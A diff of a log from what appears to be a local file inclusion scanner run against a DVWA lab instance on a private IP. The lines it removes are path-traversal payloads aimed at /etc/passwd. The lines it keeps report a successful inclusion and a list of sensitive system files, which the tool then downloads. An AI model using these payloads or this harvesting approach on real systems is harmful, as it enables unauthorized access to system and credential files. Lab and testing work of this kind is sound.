@@ -119,42 +119,17 @@ http://http://192.168.0.57/dvwa/vulnerabilities/fi/?page=include.php
 [+]  [2017-03-20 23:22:25.628204] Received status code:200
 [+]  [2017-03-20 23:22:25.628385] Target up
 [+]  [2017-03-20 23:22:25.628499] Payload generated
-current include.php
-tesasdfasdf: http://192.168.0.57/dvwa/vulnerabilities/fi/?page=etc/passwd
-current include.php
-tesasdfasdf: http://192.168.0.57/dvwa/vulnerabilities/fi/?page=../etc/passwd
-current include.php
-tesasdfasdf: http://192.168.0.57/dvwa/vulnerabilities/fi/?page=../../etc/passwd
-current include.php
-tesasdfasdf: http://192.168.0.57/dvwa/vulnerabilities/fi/?page=../../../etc/passwd
-current include.php
-tesasdfasdf: http://192.168.0.57/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd
-current include.php
-tesasdfasdf: http://192.168.0.57/dvwa/vulnerabilities/fi/?page=../../../../../etc/passwd
-current include.php
-tesasdfasdf: http://192.168.0.57/dvwa/vulnerabilities/fi/?page=../../../../../../etc/passwd
-current include.php
-tesasdfasdf: http://192.168.0.57/dvwa/vulnerabilities/fi/?page=etc/passwd%00
-current include.php
-tesasdfasdf: http://192.168.0.57/dvwa/vulnerabilities/fi/?page=../etc/passwd%00
-current include.php
-tesasdfasdf: http://192.168.0.57/dvwa/vulnerabilities/fi/?page=../../etc/passwd%00
-current include.php
-tesasdfasdf: http://192.168.0.57/dvwa/vulnerabilities/fi/?page=../../../etc/passwd%00
-current include.php
-tesasdfasdf: http://192.168.0.57/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd%00
-current include.php
-tesasdfasdf: http://192.168.0.57/dvwa/vulnerabilities/fi/?page=../../../../../etc/passwd%00
-current include.php
-tesasdfasdf: http://192.168.0.57/dvwa/vulnerabilities/fi/?page=../../../../../../etc/passwd%00
 -----------------------------------------------------------------
 [+]  [2017-03-20 23:22:25.653434] Prerequisite tests show target might be vulnerable
 -----------------------------------------------------------------
+
 -----------------------------------------------------------------
 [+]  [2017-03-20 23:22:25.774420] (V)(°,,,,°)(V) WE DID IT
 [+]  [2017-03-20 23:22:25.774490] LFI found at http://192.168.0.57/dvwa/vulnerabilities/fi/?page=../../../../../etc/passwd
 -----------------------------------------------------------------
+
 [-]  [2017-03-20 23:22:25.774524] Searching in blind mode
+
 LINUX   /etc/issue                          Contains a message or system identification to be printed before the login prompt
 LINUX   /proc/version                       Contains linux release version
 LINUX   /etc/profile                        Kernel profiling information
@@ -191,8 +166,6 @@ OSX     /etc/sysctl.conf
 4:Unknown (Too lazy to do an nmap scan)
 1/2/3/4  :2
 
-
-mkdir: cannot create directory ‘TangoDown/192.168.0.57’: File exists
 [+]  [2017-03-20 23:22:26.926732] Downloaded file 0/323:/etc/issue
 [+]  [2017-03-20 23:22:26.952888] Downloaded file 1/323:/proc/version
 [+]  [2017-03-20 23:22:26.977378] Downloaded file 2/323:/etc/profile
